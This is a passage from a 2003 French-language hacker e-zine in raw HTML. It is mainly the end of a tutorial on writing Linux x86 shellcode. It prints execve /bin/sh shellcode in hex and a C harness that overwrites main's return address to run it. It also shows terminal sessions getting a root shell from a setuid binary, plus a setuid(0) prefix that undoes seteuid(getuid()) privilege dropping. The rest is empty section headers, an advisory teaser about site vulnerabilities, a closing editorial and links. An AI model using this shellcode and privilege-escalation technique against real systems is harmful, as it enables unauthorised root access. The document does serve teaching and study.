   Mais nous, on veut tester notre shellcode. Pour contourner cela, il faut placer le shellcode dans une zone de données, dans une table déclarée en variable globale. Pour l'exécuter on va remplacer l'adresse de retour de main() (qui est dans la stack) par l'adresse de la table contenant le shellcode, la table de caractères deux emplacements en dessous de la première position dans la pile, là où se situe le pointeur que nous déclarons en variable locale.&nbsp;<br>
<br>
  char shellcode[] =<br>
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<br>
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<br>
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";<br>
<br>
  int main()<br>
  {<br>
      int * ret;<br>
<br>
      /* le +2 va se comporter comme un décalage de 2 mots */<br>
      /* (i.e. 8 octets) vers le haut de la pile : */<br>
      /*   - le premier pour le mot réservé pour la variable locale */<br>
      /*   - le second pour le registre %ebp sauvegardé */<br>
<br>
      * ((int *) &amp; ret + 2) = (int) shellcode; // le + 2 équivaut à un décalage de 8 octets vers 	return (0);			       // le haut de la stack (les 4 premiers sont  				       		       // réservé pour la variable local et les autre 					               //pour %ebp)<br>
  }<br>
<br>
On teste et, bingo ;) :<br>
<br>
$ cc shellcode.c -o shellcode<br>
$ ./shellcode<br>
bash$ exit<br>
$<br>
<br>
Vérifions qu'il fait bien son boulot en installant le programme shellcode ayant le setuid root, et contrôler que le shell lancé appartient bien au root :<br>
<br>
$ Nocte<br>
Password:<br>
# chown root.root shellcode<br>
# chmod +s shellcode<br>
# exit<br>
$ ./shellcode<br>
bash# whoami<br>
root<br>
bash# exit<br>
$<br>
<br>
<br>
III. OBTENTION DES DROITS DE ROOT<br>
-----------------------------------------------<br>
<br>
   Ce shellcode est tout de même assez limité niveau capacité. S'il devient :&nbsp;<br>
<br>
  char shellcode[] =<br>
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<br>
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<br>
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";<br>
<br>
  int main()<br>
  {<br>
      int * ret;<br>
      seteuid(getuid());<br>
      * ((int *) &amp; ret + 2) = (int) shellcode;<br>
      return (0);<br>
  }<br>
<br>
on fixe l'EUID du process à la valeur du RUID. Le shell s'exécute alors sans privilège particulier.<br>
   Cependant, seteuid(getuid()) n'est pas très secure : en insérant l'équivalent de setuid(0); au début du shellcode, on  récupère les droits de l'euid initial (droits de root) :<br>
<br>
  char setuid[] =<br>
         "\x31\xc0"       /* xorl %eax, %eax */<br>
         "\x31\xdb"       /* xorl %ebx, %ebx */<br>
         "\xb0\x17"       /* movb $0x17, %al */<br>
         "\xcd\x80";<br>
<br>
<br>
Intégrons cela à notre shellcode pour avoir un shellcode qui casse la protection seteuid(getuid()) :<br>
<br>
  char shellcode[] =<br>
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" /* setuid(0) */<br>
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<br>
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<br>
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";<br>
<br>
  int main()<br>
  {<br>
      int * ret;<br>
      seteuid(getuid());<br>
      * ((int *) &amp; ret + 2) = (int) shellcode;<br>
      return (0);<br>
  }<br>
<br>
On vérifie... et ça marche :<br>
$ Nocte<br>
Password:<br>
# chown root.root shellcode<br>
# chmod +s shellcode<br>
# exit<br>
$ ./shellcode<br>
bash# whoami<br>
root<br>
bash# exit<br>
$<br>
<br>
<br>
<br>
III. DEJA PAS MAL<br>
----------------------<br>
<br>
   Comme le montre ce dernier exemple, on peut rajouter des fonctions à notre shellcode. J'espère écrire un prochain article qui traite d'autres fonctions, comme des shellcodes cassant des chroot(), ou même l'ouverture en remote d'un shell via une socket.&nbsp;<br>
   Pour cette fois-ci, ça n'était pas si mal. Si vous avez bien assimilé mon article sur els privilèges unix et connaissez les bases de l'assembleur, vous avez du comprendre sans gros problème. C'était même d'une clareté hallucinante!<br>
<br>
   J'espère que cela vous aura appris des choses, comme l'utilité d'un shellcode, ses possibilités, sa programmation.<br>
<br>
++<br>
Nocte, le 16 avril 2003<br>
à lire : l'incontournable "Smashing the stack for fun and profit" d'Aleph One.</P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>5 . FAILLE : PRINCIPE DES STACKS OVERFLOWS</FONT><font face="Verdana, Arial, Helvetica, sans-serif" size="2">
- Nocte</font><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>===================================================================== 
</FONT></P><P>&nbsp;</P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>6 . FAILLE part 2: ADVISORY "CSS VULNARABILITIES ON MILITARY SITES" - Nocte<BR>=====================================================================</FONT></P><P><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Nocte
a récemment découvert des failles de CSS. Encore !! Ca soule! Pas besoin d'en
faire une salade !! C'est vrai... sauf qu'elles concernent les plus importants
sites militaires et gouvernementaux américains. Cet advisory montre que, si
même ces sites sont vulnérables à la plus vieille et la plus basique des
failles, à combien plus forte raisons de tels sites peuvent être vulnérables
à des failles plus complexes! Un explicatif de cette faille sortira
probablement dans le prochain e-zine. Voici, ici, l'advisory oreiginal, posté
sur <a href="http://www.security-corporation.com">http://www.security-corporation.com</a>
:</font></P><P>&nbsp;</P><P>&nbsp;</P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>===================================================================== 
<BR></FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>Et de deux!
Ce numéro a été TRES réduit étant donné les événements, mais, le TDC Mag
n°3 sera plus enrichis avec des participations extérieures très
intéressantes. Il est déjà actuellement en préparation ;)&nbsp;</FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> J'espère
toutefois que cet e-zine vous a été aussi profitable que le premier! Merci pour vos remerciements, c'est touchant et ça donne envie de continuer.&nbsp;<br>
   Alors, plus que jamais, bidouillez votre ordinateur, le Web, et contribuez à la sécurité de l'informatique.<br>
   Pour tout questions-idées-suggestions-coups de gueule... lâchez-vous sur le forum.<br>
<br>
   Merci de votre soutien. D'ores et déjà, le prochain numéro sera spécial : il contiendra des enquêtes inédits sur la sécurité de l'internet. Il contiendra surtout les résultat sur notre Team, les projets en cours... Mais, après tout, on ne le fait pas pour le sortir "à l'heure", simplement pour partager des connaissances.<br>
<br>
<br>
Je terminerais par un poème fabuleux d'un hacker anonyme :<br>
<BR><FONT COLOR="#00CC00" SIZE="1">010110100111 
<BR>101010100100 <BR>100011010111 <BR>110010101000 </FONT> </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="1" COLOR="#00CC00">100010101111 
<BR>100010101110 <BR>001011011011 <BR>101100110010 </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="1" COLOR="#00CC00">101101010010 
<BR>010101011010 <BR>010111010011 </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="1" COLOR="#00CC00">101001010111 
<BR>010101001111 <BR>111010010111 </FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> 
</FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Visitez 
nos sites : <A HREF="http://dealer-hack.ifrance.com" TARGET="_blank">http://dealer-hack.ifrance.com</A> 
&amp; <A HREF="http://dealerhacksecurity.free.fr" TARGET="_blank">http://dealerhacksecurity.free.fr</A></FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Vous 
avez des questions a propos du mag ? vous n'avez pas compris quelque chose allez sur 
le forum : <A HREF="http://dealerhacksecurity.free.fr/forum" TARGET="_blank">http://dealerhacksecurity.free.fr/forum</A><BR></FONT></P><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><B>By</B></FONT> 
 <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b>DHS - Dealer
 Hack Security</b></font></P>
</BODY>
</HTML>
